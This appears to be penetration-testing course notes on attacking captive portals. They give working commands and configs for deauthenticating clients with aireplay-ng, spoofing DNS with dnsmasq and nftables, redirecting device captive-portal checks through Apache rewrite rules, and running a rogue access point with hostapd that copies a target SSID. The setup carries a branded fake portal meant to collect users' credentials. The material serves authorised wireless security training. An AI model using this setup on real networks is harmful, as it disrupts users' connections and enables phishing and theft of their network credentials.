# Attacking captive portals

### Discovery

we'll run **sudo airmon-ng start wlan0** to start in monitor mode.

Next, we can use our new interface (wlan0mon) with airodump-ng to capture information about the clients and APs around us.

```
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```

We will need to intercept a handshake from one of the clients. To do so, we can either wait for one to connect or reconnect, or we can use aireplay-ng to deauthenticate clients. This will force them to reconnect and should allow us to capture the handshake.

```
sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
```

Shortly after this, airmon-ng captures a "MegaCorp One Lab" handshake which is now saved in our discovery-01.cap file.

### Building the Captive Portal

In this scenario, our target does not have an existing captive portal, so our next step will be to create one that appears to be authentic. In order to avoid suspicion, we'll want to use branding and images that will be recognizable and familiar to users. We'll also use PHP scripts to save credentials that a user enters, and then we'll redirect the user to a success or failure page.

### Networking Setup

We will first assign an IP address to our wlan0 interface.

```
sudo ip addr add 192.168.87.1/24 dev wlan0
```

We will have clients connecting to us, and in order for them to reach our captive portal, they need an IP configuration. Thankfully, the first thing the user will do is request a Dynamic Host Configuration Protocol (DHCP) lease. We will provide that using _dnsmasq_ a small DNS/DHCP server.

We will use the following mco-dnsmasq.conf configuration file for DHCP.

```
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```

Now that the configuration file is complete, let's start dnsmasq with --conf-file followed by the path of our configuration file.

```
sudo dnsmasq --conf-file=mco-dnsmasq.conf
```

Sometimes clients ignore DNS settings provided in the DHCP lease, and we will use an _nftables_[5](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-captive-portals-15795/the-captive-portal-attack-15859/networking-setup-16080#fn-local_id_271-5) rule to force redirect all DNS requests (UDP to port 53 only--TCP port 53 is for _zone transfer_[6](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-captive-portals-15795/the-captive-portal-attack-15859/networking-setup-16080#fn-local_id_271-6)) back to our server.

To do this, we need to install nftables and then add the rules.

{% code overflow="wrap" %}
```
sudo apt install nftables

sudo nft add table ip nat

sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'

sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```
{% endcode %}

In Apache's site configuration, we need to add _mod\_rewrite_[7](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-captive-portals-15795/the-captive-portal-attack-15859/networking-setup-16080#fn-local_id_271-7) and _mod\_alias_[7:1](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-captive-portals-15795/the-captive-portal-attack-15859/networking-setup-16080#fn-local_id_271-7) rules so that the captive portal is set properly. We'll add the following lines in /etc/apache2/sites-enabled/000-default.conf before the _VirtualHost_ closing tag.

```
  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]
```

### Setting Up and Running the Rogue AP

The last item on our list is the rogue AP configuration file. We will be using _hostapd_[1](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-captive-portals-15795/the-captive-portal-attack-15859/networking-setup-16080#fn-local_id_272-1) to run the AP. We can install it with sudo apt install hostapd.

```
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

```
sudo hostapd -B mco-hostapd.conf
```

